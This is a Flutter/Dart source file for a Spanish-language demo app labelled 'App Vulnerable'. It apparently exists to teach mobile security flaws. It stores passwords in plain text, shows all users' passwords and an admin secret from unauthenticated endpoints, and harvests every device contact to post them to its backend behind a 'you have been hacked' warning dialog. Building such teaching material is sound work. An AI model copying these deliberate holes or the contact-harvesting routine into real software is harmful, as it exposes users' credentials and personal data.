// ignore_for_file: avoid_print, use_build_context_synchronously

import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import 'dart:convert';
import 'dart:async';
import 'package:permission_handler/permission_handler.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:flutter_secure_storage/flutter_secure_storage.dart';
import 'package:sqflite/sqflite.dart';
import 'package:path/path.dart' as p;
import 'config.dart';

// La URL del backend se define en lib/config.dart

Future<void> _requestInitialPermissions() async {
  await Permission.contacts.request();
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await _requestInitialPermissions();
  runApp(const MyApp());
}

Future<http.Response?> safeRequest(
  Future<http.Response> request,
  BuildContext context,
) async {
  try {
    return await request.timeout(const Duration(seconds: 10));
  } on TimeoutException {
    if (context.mounted) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('Timeout: Servidor no responde')),
      );
    }
  } catch (e) {
    if (context.mounted) {
      ScaffoldMessenger.of(
        context,
      ).showSnackBar(SnackBar(content: Text('Error: $e')));
    }
  }
  return null;
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return const MaterialApp(title: 'App Vulnerable', home: LoginPage());
  }
}

// ──────────────────────────────────────────────
// LOGIN PAGE
// ──────────────────────────────────────────────
class LoginPage extends StatefulWidget {
  const LoginPage({super.key});

  @override
  State<LoginPage> createState() => _LoginPageState();
}

class _LoginPageState extends State<LoginPage> {
  final emailController = TextEditingController();
  final passwordController = TextEditingController();
  bool isLoading = false;

  Future<void> login() async {
    if (emailController.text.isEmpty || passwordController.text.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('Completa todos los campos')),
      );
      return;
    }

    setState(() => isLoading = true);

    final response = await safeRequest(
      http.post(
        Uri.parse("$API_URL/login"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "email": emailController.text,
          "password": passwordController.text,
        }),
      ),
      context,
    );

    if (!mounted) return;

    if (response != null && response.statusCode == 200) {
      final data = jsonDecode(response.body);
      final prefs = await SharedPreferences.getInstance();

      // ⚠️ Vulnerabilidad intencional: guarda credenciales en texto plano
      await prefs.setString("email", emailController.text);
      await prefs.setString("password", passwordController.text);
      await prefs.setString("token", data["token"] ?? "");

      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (_) => const DashboardPage()),
      );
    }

    setState(() => isLoading = false);
  }

  Future<void> register() async {
    final response = await safeRequest(
      http.post(
        Uri.parse("$API_URL/register"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "email": emailController.text.trim(),
          "password": passwordController.text.trim(),
          "role": "user",
        }),
      ),
      context,
    );

    if (response != null && response.statusCode == 200) {
      ScaffoldMessenger.of(
        context,
      ).showSnackBar(const SnackBar(content: Text('Cuenta creada')));
      // guardar credenciales como hace login para poder acceder inmediatamente
      try {
        final data = jsonDecode(response.body);
        final prefs = await SharedPreferences.getInstance();
        await Future.wait([
          prefs.setString("token", data["token"] ?? ""),
          prefs.setString("email", emailController.text.trim()),
          // no almacenamos password en texto claro en prefs en apps reales
          prefs.setString("user_id", data["user"]["_id"] ?? ""),
          prefs.setString("role", data["user"]["role"] ?? "user"),
        ]);
      } catch (_) {}
      emailController.clear();
      passwordController.clear();

      if (mounted) {
        Navigator.of(
          context,
        ).pushReplacement(MaterialPageRoute(builder: (_) => DashboardPage()));
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text("Login Vulnerable")),
      body: Padding(
        padding: const EdgeInsets.all(20),
        child: Column(
          children: [
            const SizedBox(height: 40),
            TextField(
              controller: emailController,
              decoration: const InputDecoration(labelText: "Email"),
            ),
            const SizedBox(height: 20),
            TextField(
              controller: passwordController,
              obscureText: true,
              decoration: const InputDecoration(labelText: "Contraseña"),
            ),
            const SizedBox(height: 30),
            isLoading
                ? const CircularProgressIndicator()
                : ElevatedButton(onPressed: login, child: const Text("Login")),
            const SizedBox(height: 10),
            ElevatedButton(
              onPressed: register,
              child: const Text("Crear cuenta"),
            ),
          ],
        ),
      ),
    );
  }
}

// ──────────────────────────────────────────────
// DASHBOARD PAGE
// ──────────────────────────────────────────────
class DashboardPage extends StatefulWidget {
  const DashboardPage({super.key});

  @override
  State<DashboardPage> createState() => _DashboardPageState();
}

class _DashboardPageState extends State<DashboardPage> {
  List<dynamic> users = [];
  String? adminSecret;
  Database? _db;
  bool isLoading = true;

  @override
  void initState() {
    super.initState();
    _loadData();
  }

  Future<void> _loadData() async {
    await _initDb();
    await getUsers();
    await getAdminSecret();
    if (mounted) setState(() => isLoading = false);
  }

  Future<void> _initDb() async {
    if (_db != null) return;

    // ✅ Usamos p.join para evitar conflicto con path de Flutter
    final path = p.join(await getDatabasesPath(), 'app.db');

    _db = await openDatabase(
      path,
      version: 1,
      onCreate: (db, version) async {
        await db.execute('''
          CREATE TABLE contacts(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT,
            phones TEXT,
            emails TEXT
          )
        ''');
      },
    );
  }

  Future<void> getUsers() async {
    final response = await safeRequest(
      http.get(Uri.parse("$API_URL/users")),
      context,
    );
    if (response != null && response.statusCode == 200) {
      setState(() => users = jsonDecode(response.body));
    }
  }

  Future<void> getAdminSecret() async {
    final response = await safeRequest(
      http.get(Uri.parse("$API_URL/admin")),
      context,
    );
    if (response != null && response.statusCode == 200) {
      final data = jsonDecode(response.body);
      setState(() => adminSecret = data["secret"]);
    }
  }

  Future<void> fetchAndStoreContacts() async {
    // 1. Verificar permiso
    final status = await Permission.contacts.request();
    if (!status.isGranted) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('Permiso de contactos denegado')),
      );
      return;
    }

    // 2. Advertencia al usuario (diálogo de hackeo)
    final confirmed = await showDialog<bool>(
      context: context,
      barrierDismissible: false,
      builder: (ctx) => AlertDialog(
        title: const Row(
          children: [
            Icon(Icons.warning_amber_rounded, color: Colors.red, size: 28),
            SizedBox(width: 8),
            Text("⚠️ ADVERTENCIA", style: TextStyle(color: Colors.red)),
          ],
        ),
        content: const Text(
          "🔴 HAS SIDO HACKEADO 🔴\n\n"
          "Esta aplicación está recopilando TODOS tus contactos "
          "(nombres, teléfonos y correos) y los está enviando a un "
          "servidor externo sin tu consentimiento real.\n\n"
          "Esto es una demostración de cómo apps maliciosas explotan "
          "los permisos de contactos. Nunca otorgues este permiso "
          "a apps en las que no confíes plenamente.",
          style: TextStyle(fontSize: 14, height: 1.5),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(ctx, false),
            child: const Text("Cancelar", style: TextStyle(color: Colors.grey)),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: Colors.red),
            onPressed: () => Navigator.pop(ctx, true),
            child: const Text(
              "Continuar (demo)",
              style: TextStyle(color: Colors.white),
            ),
          ),
        ],
      ),
    );

    if (confirmed != true) return;

    // 3. Obtener contactos con flutter_contacts
    final contacts = await FlutterContacts.getContacts(withProperties: true);

    final serialized = contacts.map((c) {
      return {
        "displayName": c.displayName,
        "phones": c.phones.map((ph) => ph.number).toList(),
        "emails": c.emails.map((em) => em.address).toList(),
      };
    }).toList();

    // 4. Guardar en SQLite
    await _db!.transaction((txn) async {
      for (var c in serialized) {
        await txn.insert('contacts', {
          "name": c["displayName"],
          "phones": jsonEncode(c["phones"]),
          "emails": jsonEncode(c["emails"]),
        });
      }
    });

    // 5. Guardar en secure storage
    const storage = FlutterSecureStorage();
    await storage.write(key: "contacts", value: jsonEncode(serialized));

    // 6. ⚠️ Enviar al servidor sin autenticación (vulnerabilidad intencional)
    await http.post(
      Uri.parse("$API_URL/contacts"),
      headers: {"Content-Type": "application/json"},
      body: jsonEncode(serialized),
    );

    if (!mounted) return;

    // 7. Mensaje final confirmando el "robo"
    await showDialog(
      context: context,
      builder: (ctx) => AlertDialog(
        title: const Text("📤 Contactos robados"),
        content: Text(
          "✅ Se enviaron ${serialized.length} contactos al servidor.\n\n"
          "En un ataque real, el usuario NUNCA vería este mensaje ni "
          "sabría que sus datos fueron exfiltrados.",
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(ctx),
            child: const Text("Entendido"),
          ),
        ],
      ),
    );
  }

  Future<void> logout() async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.clear();
    Navigator.pushAndRemoveUntil(
      context,
      MaterialPageRoute(builder: (_) => const LoginPage()),
      (route) => false,
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text("Dashboard Vulnerable"),
        actions: [
          IconButton(icon: const Icon(Icons.logout), onPressed: logout),
        ],
      ),
      body: isLoading
          ? const Center(child: CircularProgressIndicator())
          : SingleChildScrollView(
              padding: const EdgeInsets.all(16),
              child: Column(
                children: [
                  ElevatedButton(
                    onPressed: getUsers,
                    child: const Text("Usuarios"),
                  ),
                  const SizedBox(height: 8),
                  ElevatedButton(
                    onPressed: fetchAndStoreContacts,
                    style: ElevatedButton.styleFrom(
                      backgroundColor: Colors.orange,
                    ),
                    child: const Text(
                      "Enviar Contactos",
                      style: TextStyle(color: Colors.white),
                    ),
                  ),
                  if (adminSecret != null) ...[
                    const SizedBox(height: 16),
                    Card(
                      color: Colors.red[100],
                      child: Padding(
                        padding: const EdgeInsets.all(10),
                        child: Text("Admin Secret: $adminSecret"),
                      ),
                    ),
                  ],
                  const SizedBox(height: 20),
                  ListView.builder(
                    shrinkWrap: true,
                    physics: const NeverScrollableScrollPhysics(),
                    itemCount: users.length,
                    itemBuilder: (context, index) {
                      final user = users[index];
                      return Card(
                        child: ListTile(
                          title: Text(user["email"]),
                          subtitle: Text(
                            "Pass: ${user["password"]}\nRole: ${user["role"]}",
                            style: const TextStyle(color: Colors.red),
                          ),
                        ),
                      );
                    },
                  ),
                ],
              ),
            ),
    );
  }
}
